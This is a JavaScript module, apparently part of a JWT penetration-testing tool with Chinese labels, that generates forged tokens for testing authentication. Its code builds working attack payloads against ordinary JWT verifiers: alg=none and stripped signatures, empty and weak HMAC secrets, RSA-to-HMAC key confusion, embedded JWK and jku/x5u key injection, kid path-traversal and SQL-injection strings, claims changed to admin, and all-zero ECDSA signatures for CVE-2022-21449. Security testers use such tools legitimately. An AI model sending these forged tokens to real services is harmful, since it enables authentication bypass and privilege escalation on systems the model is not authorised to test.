import { assemble, b64url, parseJwt, pemBytes, signHmac, signKey } from './jwt.js?v=1.1.1';
import { TEST_KEYS } from './keys.js?v=1.1.1';
import { signToken } from './crypto-tools.js?v=1.1.1';

export const CATEGORIES = [
  { id: 'baseline', title: '原始请求基线', tag: 'CONTROL', detail: '保留原始 JWT，用响应对照每个测试。' },
  { id: 'none', title: 'alg = none', tag: 'BYPASS', detail: 'none / None / NONE / nOnE，含尾点与无尾点。' },
  { id: 'signature', title: '空签名与签名变形', tag: 'SIGNATURE', detail: '缺失、截断、位翻转、随机签名及多余分段。' },
  { id: 'hmac', title: '空密钥与常见弱密钥', tag: 'HMAC', detail: 'HS256 / 384 / 512 空密钥与少量测试字典重新签名。' },
  { id: 'confusion', title: 'RSA → HMAC 算法混淆', tag: 'ALGORITHM', detail: '使用目标公钥的 PEM / DER 等表示作为 HMAC secret。需要输入目标公钥。' },
  { id: 'jwk', title: '内嵌 JWK 公钥注入', tag: 'KEY INJECTION', detail: '两对 RSA 与一对 EC 测试密钥，嵌入公钥并正确签名。' },
  { id: 'jku', title: 'JKU / x5u 远程密钥', tag: 'REMOTE KEY', detail: 'JKU 指向公开 JWKS；x5u 指向公开测试证书。' },
  { id: 'kid', title: 'kid 路径与注入', tag: 'KEY LOOKUP', detail: '空值、路径遍历、空文件及 SQL 字符串，含匹配空 secret 签名。' },
  { id: 'claims', title: 'Claims 与时间篡改', tag: 'CLAIMS', detail: '角色、主体、issuer / audience、过期时间等单项变更；保留原签名。' },
  { id: 'parser', title: 'Header 与解析差异', tag: 'PARSER', detail: '重复 alg、未知 crit、typ、b64、Base64 填充等变形。' },
  { id: 'ecdsa', title: 'ECDSA 零值签名', tag: 'CVE-2022-21449', detail: 'ES256 / 384 / 512 的 JOSE 全零签名与 DER 变体。' },
  { id: 'custom', title: '自定义 Payload', tag: 'CUSTOM', detail: '使用编辑后的 JSON，组合 none、JWK 与空密钥重新签名。' },
  { id: 'fuzz', title: '自定义字段 Fuzz', tag: 'FUZZ', detail: '逐行替换 Header / Payload 字段，组合已启用的签名方式。' },
];

export async function generatePayloads(input, options = {}) {
  const parsed = parseJwt(input);
  const { header: h, payload: p, segments: s } = parsed;
  const selected = new Set(options.categories ?? CATEGORIES.map(c => c.id));
  const rows = [];
  const warnings = [];
  const add = (category, label, token, note = '') => {
    if (selected.has(category) && !rows.some(row => row.category === category && row.token === token)) {
      rows.push({ id: `JWT-${String(rows.length + 1).padStart(4, '0')}`, category, label, token, note });
    }
  };
  const forged = (header, payload = p) => assemble(header, payload, s[2]);
  add('baseline', '原始 JWT', parsed.token, '原始响应是比较基线；HTTP 200 本身不代表漏洞。');
  if (selected.has('none')) for (const alg of ['none', 'None', 'NONE', 'nOnE']) {
    const token = assemble({ ...h, alg }, p);
    add('none', `${alg} · 空签名`, token);
    add('none', `${alg} · 无尾点`, token.slice(0, -1));
  }
  if (selected.has('signature')) {
    const prefix = `${s[0]}.${s[1]}.`;
    add('signature', '保留 alg · 空签名', prefix);
    add('signature', '缺失签名段', prefix.slice(0, -1));
    add('signature', '截断签名', prefix + s[2].slice(0, Math.floor(s[2].length / 2)));
    add('signature', '签名首字符变更', prefix + (s[2][0] === 'A' ? 'B' : 'A') + s[2].slice(1));
    add('signature', '随机签名', prefix + b64url(crypto.getRandomValues(new Uint8Array(32))));
    add('signature', '额外分段', `${parsed.token}.`);
  }
  if (selected.has('hmac')) {
    for (const [alg, hash] of [['HS256', 'SHA-256'], ['HS384', 'SHA-384'], ['HS512', 'SHA-512']]) {
      add('hmac', `${alg} · 空密钥`, await signHmac({ ...h, alg }, p, '', hash));
    }
    const secrets = [...new Set(['secret', 'password', '123456', 'changeme', ...(options.secrets || '').split('\n')].filter(Boolean))];
    if (secrets.length > 100) throw new Error('弱密钥字典最多支持 100 项。');
    for (const secret of secrets) add('hmac', `HS256 · secret=${JSON.stringify(secret)}`, await signHmac({ ...h, alg: 'HS256' }, p, secret));
  }
  if (selected.has('confusion')) {
    if (!options.targetPublicKey?.trim()) warnings.push('已跳过 RS/HS 混淆：需要目标服务实际使用的 RSA 公钥。仓库测试公钥不能代替目标公钥。');
    else {
      const pem = options.targetPublicKey.trim();
      try { await crypto.subtle.importKey('spki', pemBytes(pem), { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['verify']); }
      catch { throw new Error('目标公钥必须是有效的 RSA SPKI PEM（BEGIN PUBLIC KEY）。'); }
      const representations = [['PEM · LF', pem + '\n'], ['PEM · 无尾换行', pem], ['PEM · CRLF', pem.replace(/\r?\n/g, '\r\n') + '\r\n'], ['DER', pemBytes(pem)]];
      for (const [name, key] of representations) for (const [alg, hash] of [['HS256', 'SHA-256'], ['HS384', 'SHA-384'], ['HS512', 'SHA-512']]) {
        add('confusion', `${alg} · ${name}`, await signHmac({ ...h, alg }, p, key, hash));
      }
    }
  }
  if (selected.has('jwk')) for (const key of TEST_KEYS) {
    add('jwk', `${key.jwk.alg} · ${key.id} · 内嵌公钥`, await signKey({ ...h, alg: key.jwk.alg, kid: key.jwk.kid, jwk: key.jwk }, p, key.privatePem));
  }
  if (selected.has('jku')) {
    const jwksUrl = options.jwksUrl?.trim();
    const certificateUrl = options.certificateUrl?.trim();
    for (const value of [jwksUrl, certificateUrl].filter(Boolean)) {
      let url;
      try { url = new URL(value); } catch { throw new Error('远程密钥地址必须是完整 HTTP(S) URL。'); }
      if (!['https:', 'http:'].includes(url.protocol)) throw new Error('远程密钥地址只支持 HTTP(S)。');
    }
    if (!jwksUrl && !certificateUrl) warnings.push('已跳过远程密钥：请配置公开 JWKS / 证书地址。');
    for (const key of TEST_KEYS.filter(k => k.id.startsWith('rsa'))) {
      if (jwksUrl) add('jku', `jku · ${key.id}`, await signKey({ ...h, alg: 'RS256', kid: key.jwk.kid, jku: jwksUrl }, p, key.privatePem));
      if (certificateUrl && key.id === 'rsa-a') add('jku', 'x5u · rsa-a 测试证书', await signKey({ ...h, alg: 'RS256', kid: key.jwk.kid, x5u: certificateUrl }, p, key.privatePem));
    }
  }
  if (selected.has('kid')) for (const kid of ['', '/dev/null', '../../../../../../dev/null', 'nonexistent-key', "' OR '1'='1", "key' UNION SELECT ''--"]) {
    add('kid', `kid=${JSON.stringify(kid)} · 原签名`, forged({ ...h, kid }), '原签名通常失效，用于检查是否忽略签名或产生异常。');
    add('kid', `kid=${JSON.stringify(kid)} · 空密钥 HS256`, await signHmac({ ...h, alg: 'HS256', kid }, p, ''));
  }
  if (selected.has('claims')) {
    const changes = [['sub', 'admin'], ['role', 'admin'], ['admin', true], ['isAdmin', true], ['exp', 0], ['exp', 4102444800], ['nbf', 4102444800], ['iat', 0], ['iss', 'jwt-lab'], ['aud', 'jwt-lab']];
    for (const [claim, value] of changes) add('claims', `${claim} → ${JSON.stringify(value)}`, forged(h, { ...p, [claim]: value }), '保留原签名：用于检测服务是否校验完整性。');
    for (const claim of ['exp', 'nbf', 'aud', 'iss']) {
      const changed = { ...p }; delete changed[claim];
      add('claims', `删除 ${claim}`, forged(h, changed));
    }
  }
  if (selected.has('parser')) {
    for (const patch of [{ typ: 'JWS' }, { typ: null }, { alg: 'invalid' }, { alg: null }, { crit: ['jwt-lab-unknown'], 'jwt-lab-unknown': true }, { b64: false, crit: ['b64'] }]) add('parser', `header ${JSON.stringify(patch)}`, forged({ ...h, ...patch }));
    const rest = JSON.stringify(Object.fromEntries(Object.entries(h).filter(([key]) => key !== 'alg'))).slice(1, -1);
    for (const order of selected.has('none') ? [true, false] : []) {
      const raw = `{${rest ? rest + ',' : ''}${order ? `"alg":${JSON.stringify(h.alg)},"alg":"none"` : `"alg":"none","alg":${JSON.stringify(h.alg)}`}}`;
      add('parser', `重复 alg · ${order ? 'none 后置' : 'none 前置'}`, `${b64url(raw)}.${s[1]}.`);
    }
    const padded = s.map(segment => segment + '='.repeat((4 - segment.length % 4) % 4)).join('.');
    add('parser', 'Base64URL 填充', padded);
    add('parser', '标准 Base64 字符', parsed.token.replace(/-/g, '+').replace(/_/g, '/'));
  }
  if (selected.has('ecdsa')) for (const [alg, size] of [['ES256', 64], ['ES384', 96], ['ES512', 132]]) {
    add('ecdsa', `${alg} · r=0,s=0 JOSE`, assemble({ ...h, alg }, p, b64url(new Uint8Array(size))));
    add('ecdsa', `${alg} · r=0,s=0 DER`, assemble({ ...h, alg }, p, b64url(new Uint8Array([48, 6, 2, 1, 0, 2, 1, 0]))), '故意使用非 JOSE DER 格式，检测特定实现的兼容行为。');
  }
  if (selected.has('custom')) {
    if (!options.customPayload?.trim() && !options.signWithKey) warnings.push('已跳过自定义 Payload：尚未填写 JSON。');
    else {
      let payload;
      try { payload = options.customPayload?.trim() ? JSON.parse(options.customPayload) : p; } catch { throw new Error('自定义 Payload JSON 无效。'); }
      if (!payload || Array.isArray(payload) || typeof payload !== 'object') throw new Error('自定义 Payload 必须是 JSON 对象。');
      add('custom', '自定义 · 原签名', forged(h, payload));
      // Respect disabled categories even when custom claims are enabled.
      if (selected.has('none')) add('custom', '自定义 · none', assemble({ ...h, alg: 'none' }, payload));
      if (selected.has('hmac')) add('custom', '自定义 · HS256 空密钥', await signHmac({ ...h, alg: 'HS256' }, payload, ''));
      if (selected.has('jwk')) {
        const key = TEST_KEYS[0];
        add('custom', '自定义 · JWK RS256', await signKey({ ...h, alg: 'RS256', kid: key.jwk.kid, jwk: key.jwk }, payload, key.privatePem));
      }
      if (options.signWithKey) {
        let header;
        try { header = options.customHeader?.trim() ? JSON.parse(options.customHeader) : h; } catch { throw new Error('Custom Header must be valid JSON.'); }
        if (!header || Array.isArray(header) || typeof header !== 'object') throw new Error('Custom Header must be a JSON object.');
        add('custom', 'Custom Header / Payload · supplied signing key', await signToken(header, payload, options.signingKey ?? '', { format: options.signingFormat }));
      }
    }
  }
  if (selected.has('fuzz') && options.fuzzField?.trim() && options.fuzzValues?.trim()) {
    const path = options.fuzzField.trim().split('.');
    if (path.some(key => !key || ['__proto__', 'constructor', 'prototype'].includes(key))) throw new Error('Fuzz path contains an unsupported property.');
    const values = options.fuzzValues.split(/\r?\n/).filter(line => line.trim());
    if (values.length > 50) throw new Error('Fuzzing is limited to 50 values per batch.');
    for (const line of values) {
      let value;
      try { value = JSON.parse(line); } catch { value = line; }
      const header = structuredClone(h), payload = structuredClone(p);
      let cursor = options.fuzzPart === 'header' ? header : payload;
      for (const segment of path.slice(0, -1)) {
        if (!Object.hasOwn(cursor, segment) || !cursor[segment] || typeof cursor[segment] !== 'object') cursor[segment] = {};
        cursor = cursor[segment];
      }
      cursor[path.at(-1)] = value;
      const label = `Fuzz ${options.fuzzPart === 'header' ? 'header' : 'payload'}.${path.join('.')} = ${JSON.stringify(value)}`;
      add('fuzz', `${label} · 原签名`, forged(header, payload));
      if (selected.has('none')) add('fuzz', `${label} · none`, assemble({ ...header, alg: 'none' }, payload));
      if (selected.has('hmac')) add('fuzz', `${label} · HS256 空密钥`, await signHmac({ ...header, alg: 'HS256' }, payload, ''));
      if (options.signWithKey) {
        try { add('fuzz', `${label} · supplied key`, await signToken(header, payload, options.signingKey ?? '', { format: options.signingFormat })); }
        catch (error) { warnings.push(`${label}: ${error.message}`); }
      }
    }
  }
  return { rows, warnings, parsed };
}
